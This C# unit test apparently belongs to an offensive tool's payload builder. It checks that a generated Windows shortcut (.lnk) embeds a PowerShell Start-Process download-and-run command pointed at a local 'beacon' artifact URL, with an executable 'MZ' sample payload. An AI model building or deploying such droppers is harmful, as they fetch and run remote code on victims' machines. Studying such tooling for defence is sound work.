using System.Text;
using LibraNextgen.Service.Services.Packaging;
using Xunit;

namespace LibraNextgen.Tests;

/// <summary>
/// </summary>
public class BuilderPackagingTests
{
    private static byte[] SamplePayload()
    {
        var bytes = new byte[2_600_000];
        "MZ"u8.CopyTo(bytes.AsSpan(0, 2));
        return bytes;
    }

    [Fact]
    public void Lnk_Structure_Valid()
    {
        var lnk = LnkWriter.CreateDownloadAndRun("http://127.0.0.1:5270/api/beacon/artifact/45baf269");

        Assert.Equal(0x4Cu, BitConverter.ToUInt32(lnk, 0));
        Assert.Equal("00021401-0000-0000-C000-000000000046",
            new Guid(lnk.AsSpan(4, 16)).ToString("D").ToUpperInvariant());

        var flags = BitConverter.ToUInt32(lnk, 20);
        Assert.True((flags & 0x01) != 0);
        Assert.True((flags & 0x02) != 0);   // HasLinkInfo
        Assert.True((flags & 0x80) != 0);   // IsUnicode

        Assert.Equal(706, LnkWriter.TemplatePrefixLength);

        var text = Encoding.Unicode.GetString(lnk);
        Assert.Contains("api/beacon/artifact/45baf269", text);
        Assert.Contains("Start-Process", text);
        Assert.Contains("powershell.exe", text);
    }
}
